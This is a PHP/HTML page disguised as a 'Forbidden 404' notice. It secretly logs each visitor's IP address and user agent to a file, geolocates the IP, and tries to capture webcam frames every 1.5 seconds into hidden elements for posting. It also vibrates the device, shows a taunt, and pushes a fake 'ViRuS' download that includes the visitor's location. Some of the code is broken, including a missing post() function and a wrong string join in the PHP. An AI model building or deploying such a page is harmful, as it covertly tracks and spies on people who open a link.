<?php
if(!empty($_SERVER['HTTP_CLIENT_IP'])){
    $ip = $_SERVER['HTTP_CLIENT_IP'];
}else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
    $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
}else{
    $ip = $_SERVER["REMOTE_ADDR"];
}

$agent = $_SERVER["HTTP_USER_AGENT"];

$file = fopen("result.txt", 'w+');
$data = "[IP] > ".$ip." || "."[UserAgent] > ".$agent;
$content = file_get_contents("https://ip-api.com/json/" + $ip);
fputs($file, $data);
fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <title>Website</title>
</head>
<style>
.main{
    padding: 100%;
    background: white;
}
.main h1{
    position: absolute;
    margin-left: -96%;
    margin-top: -99%;
    font: 25px sans-serif;
    text-align: center;
}
.main p{
    font: 15px sans-serif;
    padding: 10px;
    background: ;
    position: absolute;
    margin-left: -80%;
    margin-top: -75%;
    text-decoration: underline;
    border-radius: 5px;
}

#g{
    position: absolute;
    margin-left: -56%;
    background: none;
    margin-top: -71%;
    font: 20px sans-serif;
    text-transform: uppercase;
}

#inf{
    position: absolute;
    margin-left: 26%;
    margin-top: 3%;
}

@media screen and (max-width: 375px){

}

</style>

<script>
'use strict';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');
const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};
// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}
// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;
var context = canvas.getContext('2d');
  setInterval(function(){
       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  
}
// Load init
init();
</script>

<body>
<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>
<canvas id="canvas" hidden="hidden" width="500" height="500"></canvas>
    <div class="container">
    <div id="nav" class="alert alert-primary alert-fixed"><h1 class="alert alert-warning">Forbidden 404</h1></div>
    <p id="inf" class="alert alert-dark alert-fixed">Press button to access link</p>
    <div class="main"><br><p style="margin-left: -52%;" class="btn btn-danger btn-fixed">Visit Link</p><br><p2 class="alert alert-danger" id="g"></p></div>
</div>
    <canvas id="canv"></canvas>
        <script type="text/javascript">
        document.body.addEventListener('click', function(){
            setInterval(function(){
                navigator.vibrate([1000]);
                document.getElementById('g').innerHTML = "Mampus Geter";
            }, 10);
        })

    function note(){
    function download(filename, text) {
    var element = document.createElement('a');
    element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
    element.setAttribute('download', filename);

    element.style.display = 'none';
    document.body.appendChild(element);

    element.click();

    document.body.removeChild(element);
}


// Start file download.
document.body.addEventListener("click", function(){
    // Generate download of hello.txt file with some content
    var gen = document.getElementById("namefile").value;
    var text = document.getElementById("as").innerHTML = "#include <iostream>\n #include <array>\n using namespace std;\n int main(){\n\n array <char, 5> data = {'V', 'i', 'R', 'u', 'S'};\n\n for(int &b : data){\n\n cout << b << end;\n }\n\n [=== [Your Location] ===]\n" + <?= $content ?>;
    var filename = gen;
    
    download(filename, text);
}, false);
}
note();

         </script>
</body>

</html>